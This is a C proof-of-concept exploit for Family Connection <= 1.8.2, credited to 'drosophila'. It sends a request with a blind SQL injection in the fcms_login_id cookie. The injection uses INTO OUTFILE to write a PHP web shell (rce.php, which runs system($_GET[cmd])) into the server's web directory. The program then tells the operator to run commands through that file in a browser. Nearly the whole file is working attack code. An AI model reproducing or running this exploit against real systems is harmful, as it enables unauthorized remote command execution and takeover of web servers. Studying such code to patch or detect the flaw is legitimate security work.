/*

        Family Connection <= 1.8.2 - Remote Command Execution
        
        Proof of Concept - Written by Salvatore "drosophila" Fresta

        The following software will create a file (rce.php) in the
        specified path using Blind SQL Injection bug. To exec remote
        commands, you must open the file using a browser.
        
*/      

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>

int socket_connect(char *server, int port) {

        int fd;
        struct sockaddr_in sock;
        struct hostent *host;
        
        memset(&sock, 0, sizeof(sock));
        
        if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) return -1;
        
        sock.sin_family = AF_INET;
        sock.sin_port = htons(port);
        
        if(!(host=gethostbyname(server))) return -1;
        
        sock.sin_addr = *((struct in_addr *)host->h_addr);
        
        if(connect(fd, (struct sockaddr *) &sock, sizeof(sock)) < 0) return -1;
        
        return fd;

}

int socket_send(int socket, char *buffer, size_t size) {
        
        if(socket < 0) return -1;

        return write(socket, buffer, size) < 0 ? -1 : 0;
        
}

void usage(char *bn) {

        printf("\n\nFamily Connection <= 1.8.2 - Remote Command Execution\n"
                        "Proof of Concept - Written by Salvatore \"drosophila\" Fresta\n\n"
                        "usage: %s <server> <path> <fs path>\n"
                        "example: %s localhost /fcms/ /var/www/htdocs/fcms/\n\n", bn, bn);      

}

int main(int argc, char *argv[]) {
        
        int sd;
        char code[] = "'<?php echo \"<pre>\"%3b system($_GET[cmd])%3b echo
\"</pre><br><br>\"%3b?>'",
                *buffer;
        
        if(argc < 4) {
                usage(argv[0]);
                return -1;
        }
        
        if(!(buffer = (char
*)calloc(216+strlen(argv[1])+strlen(argv[2])+strlen(argv[3]),
sizeof(char)))) {
                perror("calloc");
                return -1;
        }
        
        sprintf(buffer, "GET %shome.php HTTP/1.1\r\n"
                                        "Host: %s\r\n"
                                        "Cookie: fcms_login_id=-1 UNION ALL SELECT
%s,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 INTO OUTFILE
'%srce.php'#\r\n\r\n",
                                        argv[2], argv[1], code, argv[3]);
                                        
        printf("\n[*] Connecting...");
        
        if((sd = socket_connect(argv[1], 80)) < 0) {
                perror("[-] Connection failed");
                free(buffer);
                return -1;
        }
        
        printf("\n[+] Connected"
                        "\n[*] Sending...");
        
        if(socket_send(sd, buffer, strlen(buffer)) < 0) {
                perror("[-] Sending failed");
                free(buffer);
                return -1;
        }
        
        printf("\n[+] Sent\n\n"
                        "Open your browser and  try to connect to
http://%s%srce.php?cmd=ls\n\n", argv[1], argv[2]);
                        
        recv(sd, buffer, 1, 0);
        
        close(sd);
        free(buffer);
        
        printf("[+] Connection closed\n\n");
        
        return 0;
        
}
